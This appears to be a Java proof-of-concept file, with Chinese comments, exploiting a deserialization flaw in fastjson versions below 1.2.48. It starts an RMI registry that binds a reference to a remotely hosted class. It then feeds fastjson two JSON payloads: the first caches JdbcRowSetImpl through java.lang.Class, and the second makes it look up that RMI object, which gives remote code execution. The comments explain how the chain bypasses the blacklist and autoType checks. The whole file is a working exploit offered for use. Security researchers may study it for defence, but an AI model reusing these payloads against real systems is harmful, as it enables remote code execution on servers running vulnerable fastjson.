package com.xyh.fastjson;

import com.alibaba.fastjson.JSON;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.NamingException;
import javax.naming.Reference;

/**
 * fastjson 1.2.48以下不需要任何配置，默认配置通杀RCE
 * @author xuanyh
 */
public class NoNeedAutoTypePoc {

  static {
    //rmi server示例
    try {
      Registry registry = LocateRegistry.createRegistry(43657);
      //TODO 把resources下的Calc.class拷贝到下面代码所示http://host:port的web服务器根目录即可
      Reference reference = new Reference("Calc","Calc","http://localhost/");
      ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
      registry.bind("Calc",referenceWrapper);
    } catch (RemoteException e) {
      e.printStackTrace();
    } catch (AlreadyBoundException e) {
      e.printStackTrace();
    } catch (NamingException e) {
      e.printStackTrace();
    }
  }

  public static void main(String[] args) {
    //jdk版本高的需要开启URLCodebase trust
    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");

    /*
    * TODO 该payload需要先通过java.lang.Class把com.sun.rowset.JdbcRowSetImpl加载进fastjson缓存，然后利用
    * TODO checkAutoType方法的缺陷（先通过缓存查询，有则立马返回，否则检查黑名单hash）绕过黑名单和autoType的检查
    */
    String payload = "{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}";
    String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:43657/Calc\",\"autoCommit\":true}";
    JSON.parse(payload);
    JSON.parse(payload2);
    //所以，该payload需要分两步进行
  }
}
